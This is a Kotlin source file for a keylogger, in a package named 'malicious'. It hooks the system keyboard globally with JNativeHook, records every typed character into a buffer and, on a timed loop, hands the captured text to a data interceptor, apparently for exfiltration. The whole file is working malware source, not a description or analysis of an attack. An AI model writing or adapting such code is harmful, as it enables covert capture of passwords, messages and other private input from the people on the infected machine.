package malicious.keylogger

import com.github.kwhat.jnativehook.GlobalScreen
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener
import kotlinx.coroutines.*
import kotlinx.serialization.Serializable
import malicious.interceptors.DataInterceptor

class KeyLogger(
    private val collectionIntervalSeconds: Int,
    private val interceptor: DataInterceptor,
) : NativeKeyListener {

    private var inputBuffer: StringBuilder = StringBuilder()

    init {
        GlobalScreen.registerNativeHook()
        GlobalScreen.addNativeKeyListener(this)
    }

    override fun nativeKeyTyped(e: NativeKeyEvent?) {
        val c = e?.keyChar

        if (c != null && Character.isDefined(c)) {
            inputBuffer.append(c)
        }
    }

    suspend fun collectKeyloggerData() {
        coroutineScope {
            launch(Dispatchers.IO) {
                while(true) {
                    delay(collectionIntervalSeconds * 1000L)
                    sendCollectedKeyloggerData()
                }
            }
        }
    }

    private fun sendCollectedKeyloggerData() {
        runBlocking {
            interceptor.onData(KeyloggerData(inputBuffer.toString()))
        }
        inputBuffer.clear()
    }
}

@Serializable
data class KeyloggerData(
    val collectedData: String,
    val type: String = "keylogger",
)